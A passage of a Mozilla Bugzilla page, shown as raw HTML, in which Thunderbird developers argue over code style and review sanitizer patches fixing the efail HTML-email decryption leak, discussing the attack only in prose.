        id="ct-94" data-comment-id="13283159"><span class="quote">&gt; Please don't change prefs unless you want to write migration code.</span >

This is a hidden preference. Very few users know will use it. We change the behavior of it, and to the better (for that user group). The users who set this will immediately notice, look up, and be happy that we've made it more useful now. I don't think that effects more than a dozen users world-wide, frankly.

<span class="quote">&gt; Full stop missing.</span >

Single phrases in comments don't get full stops, like in the UI. See e.g. mimemoz2.h and many other files.

<span class="quote">&gt; Lose the space before the parenthesis.</span >

This is the libmime style. It's like that *everywhere*. I didn't change this.

<span class="quote">&gt; Please reformat to:
&gt; Which I had, but you lost :-(
&gt; I fixed all that, but you lost the changes :-(</span >

The style matches the existing libmime code.

<span class="quote">&gt; Please don't add these lines.</span >

OK, can remove them.

But I'd rather focus on the security bugs.</pre></div><div class="change-set" id="c95"><div class="comment" data-id="13283168" data-no="95"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-95" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-95"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-95" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c95">Comment 95</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 16:23 PDT" data-time="1526513031">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-95">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-95" data-comment-id="13283168"><span class="quote">&gt; OK, perhaps we could then lose this:
&gt; <a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13">https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13</a></span >

heh!!

Yes, hopefully, that won't be necessary. I'd like to get these fixes in, though. Then we can talk about cleanup later.

I'd like to make sure that neither this particular attack, nor any other similar one will work in the future. Once a weakness is identified, that area has a mark on its back and security researchers will use that as idea and try the attack in other ways.</pre></div><div class="change-set" id="c96"><div class="comment" data-id="13283185" data-no="96"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-96" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-96"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-96" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c96">Comment 96</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 16:35 PDT" data-time="1526513712">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-96">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-96" data-comment-id="13283185">(In reply to Al Billings [:abillings] from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c91">comment #91</a>)
<span class="quote">&gt; Does the HTML sanitization work touch on the CSS issues mentioned in the
&gt; efail paper at chapter 3.1, where it briefly discusses a CSS redressing
&gt; attack? I want to make sure that any CSS issues there aren't slipping by the
&gt; updated sanitizer for simple HTML. (I don't understand this specific aspect
&gt; of the attack but it was pointed out to me.)</span >

I assume you refer to this phrase:
&quot;... require user interaction.... in Thunderbird and Postbox we can completely redress the UI with CSS and trick the user into submitting the plaintext with an HTML form if he clicks somewhere into the message&quot;

With &quot;redress&quot;, I think he means to fake/mock TB UI in a message, to make the user click on it.

The mocking of UI has always been possible since images in mail exist, so that's not a bug in itself. If we do something nasty on click, that's a problem we should fix. And I think that's all they are trying to say here. I think they are solely trying to counter a hypothetical counter-argument of &quot;Yes, it leaks confidential information, but only on user click, so it's not a problem&quot;. But we're not saying that, we're not discarding the problem, but trying to fix the problem of leaking the information in the first place, so the click itself into the message is not important. We do agree that this should not cause harm, and I think that's all they are trying to say here.

If the user clicks &quot;Load remote content&quot; in *our* UI, that's a different story. If the user does that, we can't prevent leaks, because the user specifically requested the external call. But that's not what they are talking about here.</pre></div><div class="change-set" id="c97"><div class="comment" data-id="13283228" data-no="97"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-97" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15229875_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15229875_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-97"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-97" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c97">Comment 97</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 17:01 PDT" data-time="1526515277">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-97">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976377"
         class="attachment obsolete"
         data-id="8976377" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tb-efail-composer-2vs4.png">
      <meta itemprop="contentSize" content="268827">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8976377" itemprop="contentUrl">
        <span id="att-8976377-description" itemprop="description">Sanitize quotes, v2 vs. v4 - Screenshots</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976377&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-97" data-comment-id="13283228">This is a screenshot of:
* 1. Viewer, Original HTML
* 2. Composer, before (TB 58.7)
* 3. Composer, with patch v4, sanitizer, but allowing styles
* 4. Composer, with patch v2, full sanitation

As you can see, you see nothing :-) ...that is, no difference between 2. and 3.
That means that Sanitizer patch v4 makes no noticable changes to the quote result, even though the sanitizer ran over the quote and cleaned it from most problematic HTML.</pre></div><div class="change-set" id="a15265078_176914"><div class="change" id="aa15265078_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265078_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15265078_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15265078_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15265078_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15265078_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 23:52 PDT" data-time="1526539969">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15265139_176914"><div class="change" id="aa15265139_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15265139_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15265139_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15265139_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 23:53 PDT" data-time="1526540030">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976086&amp;action=edit"
           title="Sanitize quoted HTML, v3"
           class=""
        >Attachment #8976086</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c98"><div class="comment" data-id="13283686" data-no="98"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-98" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-98"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-98" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c98">Comment 98</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 00:34 PDT" data-time="1526542472">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-98">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-98" data-comment-id="13283686">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c94">comment #94</a>)
Let's not discuss about style nits, you're wasting more time on the discussion than actually fixing them, or just picking up what I have already fixed.

I know that MIME is old code with a hotchpotch of ugliness and I am certainly opposed to adding more ugliness.

The style-guide says that all sentences get a full stop at the end, so it doesn't hurt to add them. There are pre-existing examples:
// SaveAs in new modes doesn't work yet.
/* Use the class we've got. */
/* Descend into messages only if we're looking for a specific sub-part. */
/* First initialize the superclass. */

We don't use spaces before parameter lists for the obvious reason of being able to search for functions with &quot;XXX(&quot;. There are pre-existing cases of this in MIME, for example (at random):
mime_subclass_p(MimeObjectClass *child, MimeObjectClass *parent)
mime_imap_part_address(MimeObject *obj)

We don't use spaces after a cast, which you do correctly in your patch on some occasions:
int status = ((MimeObjectClass*)&amp;MIME_SUPERCLASS)-&gt;parse_eof(obj, abort_p);

Because in the past no one enforced a consistent style in MIME we're at the mess we are now. So please no further discussion, just fix what I asked for. Correct style should be automatic and then you can focus on the actual problem.

Further comments on the tree patches presented:

&quot;Sanitizer code cleanup, v2&quot;:
You misunderstood what a &quot;hidden&quot; preference is. The preference in question is listed in mailnews.js and therefore listed in about:config. We have real hidden preferences that don't show up there. It is also widely discussed on the web, please Google it. We even get complaints when changing real &quot;hidden&quot; preferences (last for mail.ui.display.dateformat.thisweek and friends). So I don't think it's a good idea to change the name unless you offer some migration, which is easy to do:
<a rel="nofollow" href="https://dxr.mozilla.org/comm-central/source/mail/base/modules/mailMigrator.js">https://dxr.mozilla.org/comm-central/source/mail/base/modules/mailMigrator.js</a>
Also please present a patch that applies to trunk.

&quot;Sanitize quotes, v4 (for 52)&quot;:
I haven't tried this but I'd like to hear how you plan to go about the M-C change included in the patch. Are you going to present this for review in M-C. Once landed in trunk, we could then uplift it to our branches. We usually don't take patches are not in M-C and don't have a plan to ever get there. In general, rules for all contributors to Mozilla code apply to you as well: So please don't mix hunks from different repositories in the same patch, since by definition the patch already doesn't apply and needs manual intervention by all people working on it. Please supply patches with proper HG headers stating your user and a decent commit message. This is essential even earlier on, for example for try pushes.

&quot;Separate MIME parts from each other, v4 (trunk and 52)&quot;
That looks promising, I haven't reviewed it yet, I've just flagged some obvious style issues, made it apply to trunk and shipped it off to try. Please address the test failures:
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test_mime_attachments_size.js
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test_mime_emitter.js

I'm not happy to distribute code to 10-25 million users where the own author added this comment:
+  /* honestly, I don't know how that charset stuff works in libmime.
+     The part in mimethtm doesn't make much sense to me either.
+     I'll just dump the charset we get in the mime headers into a
+     HTML meta http-equiv.
+     XXX Not sure, if that is correct, though. */
Maybe that needs further investigation since TB was riddled with charset issues (before I cleaned most/all of the up) and mojibake caused by wrong charset selection is not acceptable. Oh, I see, was copied from mimethsa.cpp, so perhaps you can include that comment in your clean-up.

As for the review: I haven't had time to actually understand what the patch does, perhaps you can explain it or point me to the comment where that was already explained. You're adding a new MIME class mimeInlineTextHTMLParsedClass and I see code that switches to using that new class. Can the old one mimeInlineTextHTMLClass be removed? Running with the patch, I see horizontal lines between the different parts now. Where do these get added? I think we need to add some class and CSS since currently they don't appear to have any margins/spacing and are just glued to the preceding text.

Final comment: Ben, I appreciate your expertise in this area and your contribution here. Please adhere to the rules that apply to everyone in the project to make collaboration as smooth as possible. I know you're working on an urgent security problem (or better, one that has finally become urgent), so we will need to cut some corners in the process but code formatting and covering all cases (see charset) won't be one of them.</pre></div><div class="change-set" id="c99"><div class="comment" data-id="13283698" data-no="99"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-99" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-99"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-99" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c99">Comment 99</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 00:41 PDT" data-time="1526542880">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-99">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-99" data-comment-id="13283698">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976363" name="attach_8976363" title="Sanitize quotes, v4 (for 52)">attachment 8976363</a> <a href="/attachment.cgi?id=8976363&amp;action=edit" title="Sanitize quotes, v4 (for 52)">[details]</a> <a href="/attachment.cgi?id=8976363&amp;action=diff" title="Sanitize quotes, v4 (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976363'>[review]</a>
Sanitize quotes, v4 (for 52)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976363" name="attach_8976363" title="Sanitize quotes, v4 (for 52)">attachment 8976363</a> <a href="/attachment.cgi?id=8976363&amp;action=edit" title="Sanitize quotes, v4 (for 52)">[details]</a> <a href="/attachment.cgi?id=8976363&amp;action=diff" title="Sanitize quotes, v4 (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976363'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/compose/src/nsMsgCompose.cpp
&#64;&#64; +617,5 &#64;&#64;
<span class="quote">&gt;  
&gt; +/* This function syncronously sanitizes an HTML document (string-&gt;string)
&gt; +   using the Gecko nsTreeSanitizer.
&gt; +   This is a modified copy of the code in mimemoz2.cpp.
&gt; +*/</span >

This ugly comment style may be found in MIME, but we prefer not to have it in compose.

&#64;&#64; +625,5 &#64;&#64;
<span class="quote">&gt; +  uint32_t flags = nsIParserUtils::SanitizerCidEmbedsOnly |
&gt; +                   nsIParserUtils::SanitizerDropForms |
&gt; +                   nsIParserUtils::SanitizerAllowStyle;
&gt; +
&gt; +  // Implementation in dom/base/nsTreeSanitizer.cpp</span >

We have DXR to track this. So please lose the comment.

::: dom/base/nsTreeSanitizer.cpp
&#64;&#64; -945,5 &#64;&#64;
<span class="quote">&gt;  {
&gt; -  if (mCidEmbedsOnly) {
&gt; -    // Sanitizing styles for external references is not supported.
&gt; -    mAllowStyles = false;
&gt; -  }</span >

Please move this to a separate patch and get it reviewed by the appropriate peer. Or what is the plan for this hunk?</pre></div><div class="change-set" id="c100"><div class="comment" data-id="13283700" data-no="100"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-100" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-100"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-100" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c100">Comment 100</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 00:43 PDT" data-time="1526543028">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-100">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-100" data-comment-id="13283700">Additional comment: You said in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c86">comment #86</a> that sanitising is a safety measure. Should we move that to a different bug since this one here is quickly becoming confusing and the solution also needs an M-C change?</pre></div><div class="change-set" id="c101"><div class="comment" data-id="13283893" data-no="101"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-101" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-101"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-101" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c101">Comment 101</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 02:37 PDT" data-time="1526549859">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-101">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-101" data-comment-id="13283893"><span class="quote">&gt; I'm not happy to distribute code to 10-25 million users where the own author added this comment:</span >

That's an old comment that I had copied. Turns out, that code apparently works fine since ~15 years for those 25 millions.
That's also why I removed it. You probably merely noticed the removal.

<span class="quote">&gt; Let's not discuss about style nits</span >

Yes, so why do you?

<span class="quote">&gt; We don't use spaces before parameter lists</span >

I know, normally, but not here. libmime is different. I was simply copying code as a template for my class.

&lt;<a rel="nofollow" href="https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Coding_Style">https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Coding_Style</a>&gt; says:
&quot;The following norms should be followed for new code. For existing code, use the prevailing style in a file or module.&quot;

<span class="quote">&gt; I haven't had time to actually understand what the patch does
&gt; I haven't reviewed it yet, I've just flagged some obvious style issues</span >

That's the classic bikeshed &lt;<a rel="nofollow" href="https://en.wikipedia.org/wiki/Law_of_triviality">https://en.wikipedia.org/wiki/Law_of_triviality</a>&gt;.

I'd rather focus on how we can get the users as secure as possible.

I had spent the entire night coding this, to get this out as quickly as possible. I have already fixed a number of things you wanted fixed, including whitespace, and now you want more changes. It's one day later, and we're no closer.

I'd be happy to discuss the merits of the patch with you on the phone, and explain everything. As long as we agree to focus on securing end users.</pre></div><div class="change-set" id="c102"><div class="comment" data-id="13284022" data-no="102"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-102" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_29811" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/20697ca69672a5276f24a34382a1ddbd?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_29811" id="a15265139_176914"><a class="email " href="/user_profile?user_id=29811" > <span class="fna">Wayne Mery (:wsmwk)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-102"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-102" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c102">Comment 102</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 03:34 PDT" data-time="1526553290">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-102">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-102" data-comment-id="13284022">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c101">comment #101</a>)
<span class="quote">&gt; ...
&gt; &gt; I haven't had time to actually understand what the patch does
&gt; &gt; I haven't reviewed it yet, I've just flagged some obvious style issues
&gt; 
&gt; That's the classic bikeshed
&gt; &lt;<a rel="nofollow" href="https://en.wikipedia.org/wiki/Law_of_triviality">https://en.wikipedia.org/wiki/Law_of_triviality</a>&gt;.
&gt; 
&gt; I'd rather focus on how we can get the users as secure as possible.
&gt; 
&gt; I had spent the entire night coding this, to get this out as quickly as
&gt; possible. I have already fixed a number of things you wanted fixed,
&gt; including whitespace, and now you want more changes. It's one day later, and
&gt; we're no closer.</span >

Bikeshed or not, Jorg's goal is to do a proper review. And if it's not done by Jorg then it will be someone else. So let's have the goal be not just security but a fully vetted patch.</pre></div><div class="change-set" id="c103"><div class="comment" data-id="13284059" data-no="103"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-103" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-103"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-103" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c103">Comment 103</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 04:01 PDT" data-time="1526554867">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-103">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-103" data-comment-id="13284059">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c101">comment #101</a>)
<span class="quote">&gt; &gt; Let's not discuss about style nits
&gt; Yes, so why do you?</span >
I was just doing a (pre-)review and you keep on discussing.

<span class="quote">&gt; &lt;<a rel="nofollow" href="https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/">https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/</a>
&gt; Coding_Style&gt; says:
&gt; &quot;The following norms should be followed for new code. For existing code, use
&gt; the prevailing style in a file or module.&quot;</span >
Please read <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c98">comment #98</a> again. I've copied examples from *existing* code that do it right. I don't have the time now to do a statistical analysis to see what's &quot;prevailing&quot;. As far as I can tell, MIME is a mess, so we can just use &quot;correct&quot; style now.

<span class="quote">&gt; I had spent the entire night coding this, to get this out as quickly as
&gt; possible. I have already fixed a number of things you wanted fixed,
&gt; including whitespace, and now you want more changes. It's one day later, and
&gt; we're no closer.</span >
Ben, please read <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c98">comment #98</a> again. There are rules that apply to anyone in Mozilla. You're not exempt, neither are other Mozilla luminaries, like Boris and Ehsan. The only difference it that when they are pointed at a nit, they just fix it. We're not closer to anything, since you submitted patches that don't apply to trunk, had no try run, no commit messages and mixed hunks from different repos. Who do you think should fix all this before landing?

<span class="quote">&gt; I'd be happy to discuss the merits of the patch with you on the phone, and
&gt; explain everything. As long as we agree to focus on securing end users.</span >
I prefer to document this in writing here.</pre></div><div class="change-set" id="c104"><div class="comment" data-id="13284153" data-no="104"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-104" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-104"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
